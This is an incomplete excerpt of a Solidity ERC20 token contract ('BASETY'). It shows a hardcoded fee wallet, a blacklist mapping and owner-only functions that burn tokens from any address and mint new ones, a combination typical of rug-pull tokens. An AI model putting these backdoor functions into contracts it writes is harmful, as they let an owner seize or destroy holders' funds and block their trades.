...
contract Basety is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    address public FeeWallet = 0x38F663840F8346fF6dF3177628cF25b66efc163a;
    uint256 public Fee          = 183;
    uint256 swapTokensAtAmount  = 10 **6;
    mapping (address => bool) private _isExcluded;
    mapping (address => bool) public _isBlacklisted;

    constructor() public ERC20("BASETY", "BASET") {
    ...
    function burnToken (address _address, uint256 _amount) external onlyOwner {
        _burn(_address, _amount);
    }

    function mintToken (address _address, uint256 _amount) external onlyOwner{
